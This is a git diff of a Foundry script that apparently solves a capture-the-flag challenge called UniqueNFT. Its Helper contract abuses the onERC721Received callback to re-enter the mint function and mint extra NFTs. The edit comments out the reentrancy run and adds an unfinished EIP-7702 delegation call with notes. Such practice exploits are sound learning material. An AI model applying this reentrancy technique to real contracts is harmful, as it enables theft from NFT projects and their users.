@@ -29,7 +29,7 @@ contract Helper {
 		if (instance.tokenId() == 3)
 			return (this.onERC721Received.selector);
 		instanceAddr.call{value: 0 ether}(bytes.concat(keccak256("mintNFTSmartContract()")));
-		return this.onERC721Received.selectori;
+		return this.onERC721Received.selector;
 	}
 
 }
@@ -42,24 +42,44 @@ contract UniqueNFTSolver is Script {
 	address me = vm.envAddress("PUB");
 
 	function run() external {
-		vm.startBroadcast(prv);
 
 
-		// using mintNFTSmartContract as reentrancy endpoint is impossible because it is protected by the ReentrancyGuard
-		// using mintNFTEOA on the other hand is not practical because EOA cant have callback implementation 
-		// that is why we need our contract Helper to act as EOA, this solves our problems
-		UniqueNFT instance = new UniqueNFT();
-		Helper helper = new Helper{value: 2 ether}(address(instance));
+		vm.signDelegation();
 
-		console.log(instance.balanceOf(me));
-		console.log(instance.balanceOf(address(helper)));
+
+
+		// vm.startBroadcast(prv);
+
+
+		// // using mintNFTSmartContract as reentrancy endpoint is impossible because it is protected by the ReentrancyGuard
+		// // using mintNFTEOA on the other hand is not practical because EOA cant have callback implementation 
+		// // that is why we need our contract Helper to act as EOA, this solves our problems
+		// UniqueNFT instance = new UniqueNFT();
+		// Helper helper = new Helper{value: 2 ether}(address(instance));
+
+		// console.log(instance.balanceOf(me));
+		// console.log(instance.balanceOf(address(helper)));
+
+
+		// // Signs an EIP-7702 authorization for a given implementation
+		// // SignedDelegation signed = vm.signDelegation(address implementation, uint256 privateKey);
+
+		// // // Attach a signed authorization — the next tx is EIP-7702
+		// // vm.attachDelegation(signed);
+
+		// // // A shortcut to both sign + attach before the next call
+		// // SignedDelegation signed2 = vm.signAndAttachDelegation(address implementation, uint256 privateKey);
+
+
+
+
 		
-		helper.onERC721Received(address(0), address(0), 0, "");
+		// helper.onERC721Received(address(0), address(0), 0, "");
 
-		console.log(instance.balanceOf(me));
-		console.log(instance.balanceOf(address(helper)));
+		// console.log(instance.balanceOf(me));
+		// console.log(instance.balanceOf(address(helper)));
 
-		vm.stopBroadcast();
+		// vm.stopBroadcast();
 	
 	}
 
